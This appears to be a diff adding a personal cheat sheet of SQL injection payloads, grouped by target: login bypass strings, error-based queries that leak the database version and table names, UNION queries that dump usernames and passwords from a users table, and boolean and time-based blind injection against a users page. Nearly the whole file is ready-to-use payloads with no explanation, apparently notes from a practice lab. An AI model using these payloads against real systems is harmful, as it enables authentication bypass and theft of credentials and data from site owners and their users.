@@ -1,0 +1,31 @@
+LoGIN page:
+
+non-existent-user' OR 1=1 -- //
+bob' -- //
+
+**closing brackets not needed
+
+
+Verbose attacks:
+
+' or 1 in (select @@version) -- //
+' or 1=CAST((select group_concat(table_name) from information_schema.columns) AS SIGNED) -- //
+' or 1 in (select password from users where username = 'admin') -- //
+
+Search products(union):
+' order by 5 -- //
+' union select 1,2,3,4,5 -- //
+' union select null, null, database(), user(), @@version -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where
+table_schema=database() -- //
+' union select null, id, username, password, fname from users -- //
+
+Blind SQL users page:
+
+?user=1' and 1=1 -- //
+?user=admin' and substring((select table_name from information_schema.columns where column_name = 'password' LIMIT
+1),1,1)>'a' -- //
+?user=1' union select 1,2,3,4, if (substring(username,1,1) > 'd', benchmark(100000000, encode('txt','secret')),null) from
+users where id=1 -- //
+
